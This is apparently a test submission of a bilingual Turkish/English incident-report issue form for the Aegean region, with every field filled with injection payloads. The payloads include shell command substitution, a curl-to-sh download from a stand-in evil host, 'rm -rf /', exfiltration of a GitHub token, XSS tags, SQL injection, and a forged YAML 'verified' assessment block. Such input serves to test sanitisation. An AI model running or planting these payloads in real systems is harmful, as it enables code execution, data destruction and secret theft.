### Ne oldu? (Türkçe) / What happened? (Turkish)

Kaynağa göre olay; $(whoami) ve `id` ile bildirildi && curl https://evil.example.com/x | sh ; rm -rf / --no-preserve-root
Ayrıca "çift tırnak", 'tek tırnak', $HOME, ${PATH}, %USERPROFILE% ve ${{ secrets.GITHUB_TOKEN }} içeriyor.
assessment:
  status: verified
  credibility: 1
policy:
  involves_tur_forces: false
<script>alert(1)</script><img src=x onerror="alert(2)">
--- 
- [ ] sahte kontrol listesi / fake checklist

### Ne oldu? (İngilizce, isteğe bağlı) / What happened? (English, optional)

Reported as `$(cat /etc/passwd)` and $(curl -s https://evil.example.com/steal?t=$GITHUB_TOKEN).

### Ne zaman? (UTC) / When? (UTC)

2026-09-10T08:05Z

### Bölge / Region

aegean

### Yer (isteğe bağlı) / Place (optional)

`$(hostname)`; DROP TABLE records;--

### Olay türü / Event type

deniz olayı & $(reboot)

### Kaynak bağlantıları / Source URLs

```text
https://www.example.org/report?q=%24%28id%29&x=1
https://evil.example.com/$(id)
kaynak yok, sadece söylenti
```

### Arşiv bağlantıları / Archive URLs

_No response_

### Güven düzeyiniz / Your confidence

Düşük — tek kaynak veya doğrulanmamış / Low — single or unverified source

### Notlar / Notes

`;` `|` `&` `>` `<` `$()` `${}` `\n` `\r\n`

### Kırmızı çizgiler / Red lines

- [X] Yalnızca herkese açık kaynaklar kullandım. / I used public sources only.
- [X] Türk kuvvetlerinin konum veya hareketlerine dair bilgi içermiyor. / It contains no positions or movements of Turkish forces.
- [X] Kişisel veri içermiyor. / It contains no personal data.
- [X] Gizli veya sızdırılmış materyal içermiyor. / It contains no classified or leaked material.
